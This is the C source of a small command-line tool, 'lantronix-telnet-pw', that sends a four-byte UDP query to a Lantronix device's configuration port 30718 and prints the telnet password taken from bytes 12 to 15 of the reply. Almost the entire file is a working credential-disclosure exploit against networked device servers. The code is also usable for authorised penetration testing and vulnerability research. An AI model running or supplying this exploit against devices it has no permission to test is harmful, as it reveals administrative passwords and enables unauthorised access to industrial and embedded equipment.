/* lantronix-telnet-pw
 * Copyright 2011-2013 John Gordon <jgor@indiecom.org>
 */

/*   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>

#define VERSION "0.1"
#define MAX_BUF 255
#define PAYLOAD "\x00\x00\x00\xF8"

void print_version() {
    printf("lantronix-telnet-pw v%s\n", VERSION);
    exit(EXIT_SUCCESS);
}

void print_help() {
    printf("Usage: lantronix-telnet-pw -[hv] [-p PORT] HOST\n");
    printf("\n");
    printf("Options:\n");
    printf("  -p, --port=PORT  configuration port (default: 30718)\n");
    printf("  -h, --help       display this screen\n");
    printf("  -v, --version    display version\n");
    exit(EXIT_SUCCESS);
}

void error(char *fmt, ...) {
    char buf[MAX_BUF], msg[MAX_BUF];
    va_list args;

    va_start(args, fmt);
    vsnprintf(buf, MAX_BUF-1, fmt, args);
    va_end(args);

    snprintf(msg, MAX_BUF-1, "ERROR: %s", buf);

    if (errno != 0) perror(msg);
    else fprintf(stderr, "%s\n", msg);

    exit(EXIT_FAILURE);
}

static struct option long_options[] = {
    {"port", 0, 0, 'p'},
    {"help", 0, 0, 'h'},
    {"version", 0, 0, 'v'},
    {0, 0, 0, 0}
};

char setup[MAX_BUF];

char *get_setup(char *host, char *port) {
    int conn_sockfd, err;
    struct addrinfo hints, *res, *res0;
    struct sockaddr_storage their_addr;
    socklen_t addr_len;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;

    err = getaddrinfo(host, port, &hints, &res0);
    if (err) error("getaddrinfo failed: %s\n", gai_strerror(err));

    for (res = res0; res != NULL; res = res->ai_next) {
        conn_sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (conn_sockfd == -1) continue;

        err = connect(conn_sockfd, res->ai_addr, res->ai_addrlen);
        if (err == -1) continue;

        break;
    }

    if (res == NULL) error("failed to establish socket");

    freeaddrinfo(res0);

    err = send(conn_sockfd, PAYLOAD, sizeof(PAYLOAD)-1, 0);
    if (err == -1) error("failed to send payload");

    err = recv(conn_sockfd, setup, MAX_BUF-1, 0);
    if (err == -1) error("failed to receive setup");

    return setup;
}

int main(int argc, char **argv) {
    int next_arg;
    char *host, *port = "30718", *setup;
    char telnet_pw[5];
    extern char *optarg;
    extern int optind;

    while (1) {
        int option_index = 0;

        next_arg = getopt_long_only(argc, argv, "p:hv", long_options, &option_index);

        if (next_arg == -1) break;

        switch(next_arg) {
            case 'p': port = optarg; break;
            case 'v': print_version(); break;
            case 'h': default: print_help(); break;
        }
    }

    if (atoi(port) < 1 || atoi(port) > 65535) error("invalid port");

    if (optind != argc-1) print_help();

    host = argv[optind];

    setup = get_setup(host, port);

    telnet_pw[0] = setup[12];
    telnet_pw[1] = setup[13];
    telnet_pw[2] = setup[14];
    telnet_pw[3] = setup[15];
    telnet_pw[4] = '\0';

    printf("telnet password is: %s\n", telnet_pw);

    return 0;
}

